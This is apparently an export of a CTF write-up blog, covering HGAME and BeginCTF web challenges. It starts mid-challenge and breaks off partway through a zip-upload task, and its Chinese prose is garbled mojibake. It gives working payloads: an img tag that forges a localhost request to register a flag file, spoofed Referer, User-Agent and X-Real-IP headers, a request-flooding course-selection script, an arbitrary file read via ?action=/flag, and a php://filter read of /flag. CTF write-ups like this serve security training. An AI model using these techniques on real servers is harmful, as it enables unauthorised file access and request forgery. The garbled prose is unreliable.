             <span class="hljs-string">&quot;renderDelay&quot;</span>: <span class="hljs-number">3000</span>,<br>                <span class="hljs-string">&quot;timeout&quot;</span>: <span class="hljs-number">5000</span><br>            &#125;).<span class="hljs-title function_">toFile</span>(<span class="hljs-string">`./files/<span class="hljs-subst">$&#123;filename&#125;</span>`</span>, <span class="hljs-keyword">async</span> (err, _) =&gt; &#123;<br>                <span class="hljs-keyword">if</span> (err) <span class="hljs-title function_">next</span>(<span class="hljs-title function_">createError</span>(<span class="hljs-number">500</span>));<br>                <span class="hljs-keyword">const</span> checksum = <span class="hljs-keyword">await</span> <span class="hljs-title function_">getCheckSum</span>(filename);<br>                <span class="hljs-keyword">await</span> <span class="hljs-variable constant_">DB</span>.<span class="hljs-title class_">Create</span>(<span class="hljs-string">&#x27;superuser&#x27;</span>, filename, checksum)<br>                <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;admin&#x27;</span>, &#123; message : <span class="hljs-string">`Your pdf is successfully saved ğŸ¤‘ You know how to download it right?`</span>&#125;);<br>            &#125;);<br>        &#125; <span class="hljs-keyword">catch</span> (err) &#123;<br>            <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;admin&#x27;</span>, &#123; error : <span class="hljs-string">&#x27;Failed to generate pdf ğŸ˜¥&#x27;</span>&#125;)<br>        &#125;<br>    &#125;<br>&#125;);<br><br><span class="hljs-comment">// You can also add file logs here!</span><br>router.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/api/files&#x27;</span>, <span class="hljs-keyword">async</span> (req, res, next) =&gt; &#123;<br>    <span class="hljs-keyword">if</span> (req.<span class="hljs-property">socket</span>.<span class="hljs-property">remoteAddress</span>.<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/^.*:/</span>, <span class="hljs-string">&#x27;&#x27;</span>) != <span class="hljs-string">&#x27;127.0.0.1&#x27;</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-title function_">next</span>(<span class="hljs-title function_">createError</span>(<span class="hljs-number">401</span>));<br>    &#125;<br>    <span class="hljs-keyword">let</span> &#123; username , filename, checksum &#125; = req.<span class="hljs-property">query</span>;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_">typeof</span>(username) == <span class="hljs-string">&quot;string&quot;</span> &amp;&amp; <span class="hljs-title function_">typeof</span>(filename) == <span class="hljs-string">&quot;string&quot;</span> &amp;&amp; <span class="hljs-title function_">typeof</span>(checksum) == <span class="hljs-string">&quot;string&quot;</span>) &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-keyword">await</span> <span class="hljs-variable constant_">DB</span>.<span class="hljs-title class_">Create</span>(username, filename, checksum)<br>            <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;Done&#x27;</span>)<br>        &#125; <span class="hljs-keyword">catch</span> (err) &#123;<br>            <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;Error!&#x27;</span>)<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;Parameters error&#x27;</span>)<br>    &#125;<br>&#125;);<br><br>router.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/api/files/:id&#x27;</span>, <span class="hljs-keyword">async</span> (req, res) =&gt; &#123;<br>    <span class="hljs-keyword">let</span> token = req.<span class="hljs-property">signedCookies</span>[<span class="hljs-string">&#x27;token&#x27;</span>]<br>    <span class="hljs-keyword">if</span> (token &amp;&amp; token[<span class="hljs-string">&#x27;username&#x27;</span>]) &#123;<br>        <span class="hljs-keyword">if</span> (token.<span class="hljs-property">username</span> == <span class="hljs-string">&#x27;superuser&#x27;</span>) &#123;<br>            <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;Superuser is disabled now&#x27;</span>);   <br>        &#125;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-keyword">let</span> filename = <span class="hljs-keyword">await</span> <span class="hljs-variable constant_">DB</span>.<span class="hljs-title function_">getFile</span>(token.<span class="hljs-property">username</span>, req.<span class="hljs-property">params</span>.<span class="hljs-property">id</span>)<br>            <span class="hljs-keyword">if</span> (fs.<span class="hljs-title function_">existsSync</span>(path.<span class="hljs-title function_">join</span>(__dirname , <span class="hljs-string">&quot;../files/&quot;</span>, filename)))&#123;<br>                <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">send</span>(<span class="hljs-keyword">await</span> <span class="hljs-title function_">readFile</span>(path.<span class="hljs-title function_">join</span>(__dirname , <span class="hljs-string">&quot;../files/&quot;</span>, filename)));<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;No such file!&#x27;</span>);<br>            &#125;<br>        &#125; <span class="hljs-keyword">catch</span> (err) &#123;<br>            <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;Error!&#x27;</span>);<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">redirect</span>(<span class="hljs-string">&#x27;/&#x27;</span>);<br>    &#125;<br>&#125;);<br><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> router;<br></code></pre></td></tr></table></figure><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">comment<span class="hljs-selector-attr">[]</span>=&lt;<span class="hljs-selector-tag">img</span> <span class="hljs-attribute">src</span>=<span class="hljs-string">&quot;http://127.0.0.1:8888/api/files?username=admin&amp;filename=./flag&amp;checksum=111&quot;</span> /&gt;<br></code></pre></td></tr></table></figure><h2 id="Package-Manager-2021"><a href="#Package-Manager-2021" class="headerlink" title="Package Manager 2021"></a>Package Manager 2021</h2>]]></content>
    
    
    
    <tags>
      
      <tag>åšé¢˜è®°å½•</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>è®¡é™¢å†¬ä»¤è¥_week1-week4</title>
    <link href="/2024/03/01/ezHTTP/"/>
    <url>/2024/03/01/ezHTTP/</url>
    
    <content type="html"><![CDATA[<p>ä¸€äº›åšé¢˜è®°å½•</p><span id="more"></span><hr><h2 id="HGAME-ezHTTP"><a href="#HGAME-ezHTTP" class="headerlink" title="[HGAME]ezHTTP"></a>[HGAME]ezHTTP</h2><p>è¯·ä»vidar.clubè®¿é—®è¿™ä¸ªé¡µé¢ï¼š</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">Referer:</span> vidar.club<br></code></pre></td></tr></table></figure><p>è¯·é€šè¿‡Mozilla&#x2F;5.0 (Vidar; VidarOS x86_64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;121.0.0.0 Safari&#x2F;537.36 Edg&#x2F;121.0.0.0è®¿é—®æ­¤é¡µ:</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">User</span>-Agent: Mozilla/<span class="hljs-number">5</span>.<span class="hljs-number">0</span> (Vidar; VidarOS x86_64) AppleWebKit/<span class="hljs-number">537</span>.<span class="hljs-number">36</span> (KHTML, like Gecko) Chrome/<span class="hljs-number">121.0.0.0</span> Safari/<span class="hljs-number">537</span>.<span class="hljs-number">36</span> Edg/<span class="hljs-number">121.0.0.0</span><br></code></pre></td></tr></table></figure><p>è¯·ä»æœ¬åœ°è®¿é—®è¿™ä¸ªé¡µé¢ï¼š</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">X</span>-REAL-IP: <span class="hljs-number">127.0.0.1</span><br></code></pre></td></tr></table></figure><p><img src="/img/HGAME2024EZHTTP.png" alt="HGAME2024EZHTTP"></p><p>è§£ç å³å¯ï¼š<code>hgame&#123;HTTP_!s_1mP0rT4nt&#125;</code></p><h2 id="HGAME-Bypass-it"><a href="#HGAME-Bypass-it" class="headerlink" title="[HGAME]Bypass it"></a>[HGAME]Bypass it</h2><p>This page requires javascript to be enabled :)</p><p>é¦–é¡µçš„æ³¨å†Œé¡µé¢æœªå¼€æ”¾ï¼š</p><p><img src="/img/hgame2024bypassit1.png" alt="hgame2024bypassit1"></p><p>ç»“åˆé¢˜ç›®æç¤ºæƒ³åˆ°å¯èƒ½è¦åˆ©ç”¨ç¦ç”¨<code>javascript</code>ï¼Œç›´æ¥<code>about:config</code>è®¾ç½®<code>javascript.enabled</code>ä¸º<code>False</code>ï¼Œç„¶åå‘ç°èƒ½æ­£å¸¸æ³¨å†Œï¼Œéšä¾¿æ³¨å†Œä¸€ä¸ªç™»å½•ï¼š</p><p><img src="/img/hgame2024bypassit2.png" alt="hgame2024bypassit2"></p><p>ç‚¹å‡»è¿™ä¸ª<code>Click here</code>å³å¯ï¼š</p><p><code>hgame&#123;8840bb090e756adf6ac99e7728d818b37fe9ff89&#125;</code></p><h2 id="HGAME-Select-Courses"><a href="#HGAME-Select-Courses" class="headerlink" title="[HGAME]Select Courses"></a>[HGAME]Select Courses</h2><p>é€‰è¯¾è„šæœ¬ï¼Œä¸åŒçš„è¯¾æ˜¯ä»¥<code>POST</code>å½¢å¼å‘é€ï¼Œæ•°æ®ç±»ä¼¼<code>&#123;&quot;id&quot;:1&#125;</code>è¿™ç§ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><br>myurl = <span class="hljs-string">&#x27;http://47.100.137.175:30962/api/courses&#x27;</span><br>myheaders=&#123;<br><span class="hljs-string">&#x27;User-Agent&#x27;</span>: <span class="hljs-string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0&#x27;</span>,<br><span class="hljs-string">&#x27;Accept&#x27;</span>: <span class="hljs-string">&#x27;*/*&#x27;</span>,<br><span class="hljs-string">&#x27;Accept-Language&#x27;</span>: <span class="hljs-string">&#x27;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&#x27;</span>,<br><span class="hljs-string">&#x27;Accept-Encoding&#x27;</span>: <span class="hljs-string">&#x27;gzip, deflate&#x27;</span>,<br><span class="hljs-string">&#x27;Referer&#x27;</span>: <span class="hljs-string">&#x27;http://47.100.137.175:30962/&#x27;</span>,<br><span class="hljs-string">&#x27;Content-Type&#x27;</span>: <span class="hljs-string">&#x27;application/json&#x27;</span>,<br><span class="hljs-string">&#x27;Content-Length&#x27;</span>: <span class="hljs-string">&#x27;8&#x27;</span>,<br><span class="hljs-string">&#x27;Origin&#x27;</span>: <span class="hljs-string">&#x27;http://47.100.137.175:30962&#x27;</span>,<br><span class="hljs-string">&#x27;Connection&#x27;</span>: <span class="hljs-string">&#x27;close&#x27;</span>,<br><span class="hljs-string">&#x27;Cookie&#x27;</span>: <span class="hljs-string">&#x27;PHPSESSID=87e44290983eb0edfb8bc10c06cbc07f&#x27;</span><br>&#125;<br>success_count = <span class="hljs-number">0</span>  <br>selected_courses = []  <br><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    <span class="hljs-keyword">for</span> course_id <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">6</span>):<br>        <span class="hljs-keyword">if</span> course_id <span class="hljs-keyword">in</span> selected_courses:<br>            <span class="hljs-keyword">continue</span>  <br><br>        payload = <span class="hljs-string">f&#x27;&#123;&#123;&quot;id&quot;:<span class="hljs-subst">&#123;course_id&#125;</span>&#125;&#125;&#x27;</span><br>        resp = requests.post(url=myurl, headers=myheaders, data=payload)<br><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;full&quot;:0&#x27;</span> <span class="hljs-keyword">in</span> resp.text:<br>            success_count += <span class="hljs-number">1</span><br>            selected_courses.append(course_id)  <br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;ç¬¬<span class="hljs-subst">&#123;course_id&#125;</span>é—¨é€‰è¯¾æˆåŠŸ&#x27;</span>)<br><br>    <span class="hljs-keyword">if</span> success_count == <span class="hljs-number">5</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;äº”é—¨è¯¾ç¨‹éƒ½é€‰è¯¾æˆåŠŸï¼Œè·³å‡ºå¾ªç¯&quot;</span>)<br>        myurl = <span class="hljs-string">&#x27;http://47.100.137.175:30962/api/ok&#x27;</span><br>        resp = requests.get(url=myurl, headers=myheaders)<br>        <span class="hljs-built_in">print</span>(resp.text)<br>        <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure><p><img src="/img/hgame2024sc1.png" alt="hgame2024sc1"></p><p><code>flag:hgame&#123;w0W_!_1E4Rn_To_u5e_5cripT_^_^&#125;</code></p><h2 id="BeginCTF-zupload"><a href="#BeginCTF-zupload" class="headerlink" title="[BeginCTF]zupload"></a>[BeginCTF]zupload</h2><p>index.phpå­˜åœ¨ä»»æ„æ–‡ä»¶è¯»å–ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_METHOD&#x27;</span>] == <span class="hljs-string">&#x27;GET&#x27;</span>) &#123;<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;action&#x27;</span>])) &#123;<br>        <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Location: /?action=upload&#x27;</span>);<br>        <span class="hljs-keyword">die</span>();<br>    &#125;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;action&#x27;</span>])); <span class="hljs-comment">//è¿™é‡Œ</span><br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_METHOD&#x27;</span>] == <span class="hljs-string">&#x27;POST&#x27;</span>) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">json_encode</span>(<span class="hljs-keyword">array</span>(<br>        <span class="hljs-string">&#x27;status&#x27;</span> =&gt; <span class="hljs-string">&#x27;error&#x27;</span>,<br>        <span class="hljs-string">&#x27;message&#x27;</span> =&gt; <span class="hljs-string">&#x27;Not implemented yet&#x27;</span><br>    ));<br>&#125;<br></code></pre></td></tr></table></figure><p>æ‰€ä»¥ç›´æ¥<code>/?action=/flag</code>å°±è¡Œ</p><p><code>begin&#123;Ju57_r3AD_d70eba21d9d8&#125;</code></p><h2 id="BeginCTF-zupload-pro"><a href="#BeginCTF-zupload-pro" class="headerlink" title="[BeginCTF]zupload-pro"></a>[BeginCTF]zupload-pro</h2><p><code>index.php</code>:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_METHOD&#x27;</span>] == <span class="hljs-string">&#x27;GET&#x27;</span>) &#123;<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;action&#x27;</span>])) &#123;<br>        <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Location: /?action=upload&#x27;</span>);<br>        <span class="hljs-keyword">die</span>();<br>    &#125;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;action&#x27;</span>][<span class="hljs-number">0</span>] === <span class="hljs-string">&#x27;/&#x27;</span> || <span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;action&#x27;</span>], <span class="hljs-string">&#x27;..&#x27;</span>) !== <span class="hljs-literal">false</span>) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;&lt;h1&gt;Invalid action&lt;/h1&gt;&#x27;</span>);<br>    &#125;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;action&#x27;</span>]));<br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_METHOD&#x27;</span>] == <span class="hljs-string">&#x27;POST&#x27;</span>) &#123;<br>    <span class="hljs-variable">$file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br>    <span class="hljs-variable">$file_name</span> = <span class="hljs-variable">$file</span>[<span class="hljs-string">&#x27;name&#x27;</span>];<br>    <span class="hljs-variable">$file_tmp</span> = <span class="hljs-variable">$file</span>[<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>    <span class="hljs-variable">$file_size</span> = <span class="hljs-variable">$file</span>[<span class="hljs-string">&#x27;size&#x27;</span>];<br>    <span class="hljs-variable">$file_error</span> = <span class="hljs-variable">$file</span>[<span class="hljs-string">&#x27;error&#x27;</span>];<br>    <br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$file_error</span> === <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$file_size</span> &lt;= <span class="hljs-number">2097152</span>) &#123;<br>            <span class="hljs-variable">$file_destination</span> = <span class="hljs-string">&#x27;uploads/&#x27;</span> . <span class="hljs-variable">$file_name</span>;<br><br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$file_tmp</span>, <span class="hljs-variable">$file_destination</span>)) &#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">json_encode</span>(<span class="hljs-keyword">array</span>(<br>                    <span class="hljs-string">&#x27;status&#x27;</span> =&gt; <span class="hljs-string">&#x27;ok&#x27;</span>,<br>                    <span class="hljs-string">&#x27;message&#x27;</span> =&gt; <span class="hljs-string">&#x27;File uploaded successfully&#x27;</span>,<br>                    <span class="hljs-string">&#x27;url&#x27;</span> =&gt; <span class="hljs-title function_ invoke__">preg_split</span>(<span class="hljs-string">&#x27;/\?/&#x27;</span>, <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_REFERER&#x27;</span>])[<span class="hljs-number">0</span>] . <span class="hljs-variable">$file_destination</span><br>                ));<br>            &#125;<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">json_encode</span>(<span class="hljs-keyword">array</span>(<br>            <span class="hljs-string">&#x27;status&#x27;</span> =&gt; <span class="hljs-string">&#x27;error&#x27;</span>,<br>            <span class="hljs-string">&#x27;message&#x27;</span> =&gt; <span class="hljs-string">&#x27;File upload failed&#x27;</span><br>        ));<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>é€šè¿‡ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span> (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;action&#x27;</span>][<span class="hljs-number">0</span>] === <span class="hljs-string">&#x27;/&#x27;</span> || <span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;action&#x27;</span>], <span class="hljs-string">&#x27;..&#x27;</span>) !== <span class="hljs-literal">false</span>) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;&lt;h1&gt;Invalid action&lt;/h1&gt;&#x27;</span>);<br></code></pre></td></tr></table></figure><p>é™åˆ¶äº†ä¹‹å‰çš„ä»»æ„æ–‡ä»¶è¯»å–ï¼Œæƒ³äº†æƒ³æ—¢ç„¶æ²¡é™åˆ¶ä¼ªåè®®ï¼Œç›´æ¥è¯»<code>flag</code>å»ä¸å°±è¡Œå—ï¼š</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/convert.base64-encode/</span>resource=/flag<br></code></pre></td></tr></table></figure><p><code>flag:begin&#123;lS_tHi5_A_wE6sHe11_aea289d3e362&#125;</code></p><h2 id="BeginCTF-zupload-pro-plus"><a href="#BeginCTF-zupload-pro-plus" class="headerlink" title="[BeginCTF]zupload-pro-plus"></a>[BeginCTF]zupload-pro-plus</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_METHOD&#x27;</span>] == <span class="hljs-string">&#x27;GET&#x27;</span>) &#123;<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;action&#x27;</span>])) &#123;<br>        <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Location: /?action=upload&#x27;</span>);<br>        <span class="hljs-keyword">die</span>();<br>    &#125;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;action&#x27;</span>][<span class="hljs-number">0</span>] === <span class="hljs-string">&#x27;/&#x27;</span> || <span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;action&#x27;</span>], <span class="hljs-string">&#x27;..&#x27;</span>) !== <span class="hljs-literal">false</span>) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;&lt;h1&gt;Invalid action&lt;/h1&gt;&#x27;</span>);<br>    &#125;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;action&#x27;</span>]));<br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_METHOD&#x27;</span>] == <span class="hljs-string">&#x27;POST&#x27;</span>) &#123;<br>    <span class="hljs-variable">$file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br>    <span class="hljs-variable">$file_name</span> = <span class="hljs-variable">$file</span>[<span class="hljs-string">&#x27;name&#x27;</span>];<br>    <span class="hljs-variable">$file_tmp</span> = <span class="hljs-variable">$file</span>[<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>    <span class="hljs-variable">$file_size</span> = <span class="hljs-variable">$file</span>[<span class="hljs-string">&#x27;size&#x27;</span>];<br>    <span class="hljs-variable">$file_error</span> = <span class="hljs-variable">$file</span>[<span class="hljs-string">&#x27;error&#x27;</span>];<br>    <br>    <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">explode</span>(<span class="hljs-string">&#x27;.&#x27;</span>, <span class="hljs-variable">$file_name</span>);<br>    <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$file_ext</span>[<span class="hljs-number">1</span>]);<br>    <br>    <span class="hljs-variable">$allowed</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;zip&#x27;</span>);<br>    <br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$file_ext</span>, <span class="hljs-variable">$allowed</span>)) &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$file_error</span> === <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-variable">$file_size</span> &lt;= <span class="hljs-number">2097152</span>) &#123;<br>                <span class="hljs-variable">$file_destination</span> = <span class="hljs-string">&#x27;uploads/&#x27;</span> . <span class="hljs-variable">$file_name</span>;<br>    <br>                <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$file_tmp</span>, <span class="hljs-variable">$file_destination</span>)) &#123;<br>                    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">json_encode</span>(<span class="hljs-keyword">array</span>(<br>                        <span class="hljs-string">&#x27;status&#x27;</span> =&gt; <span class="hljs-string">&#x27;ok&#x27;</span>,<br>                        <span class="hljs-string">&#x27;message&#x27;</span> =&gt; <span class="hljs-string">&#x27;File uploaded successfully&#x27;</span>,<br>                        <span class="hljs-string">&#x27;url&#x27;</span> =&gt; <span class="hljs-title function_ invoke__">preg_split</span>(<span class="hljs-string">&#x27;/\?/&#x27;</span>, <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_REFERER&#x27;</span>])[<span class="hljs-number">0</span>] . <span class="hljs-variable">$file_destination</span><br>                    ));<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">json_encode</span>(<span class="hljs-keyword">array</span>(<br>            <span class="hljs-string">&#x27;status&#x27;</span> =&gt; <span class="hljs-string">&#x27;error&#x27;</span>,<br>            <span class="hljs-string">&#x27;message&#x27;</span> =&gt; <span class="hljs-string">&#x27;Only zip files are allowed&#x27;</span><br>        ));<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™æ¬¡é€šè¿‡ä»¥ä¸‹ä»£ç å®ç°äº†å¯¹æ–‡ä»¶åçš„è¿‡æ»¤ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 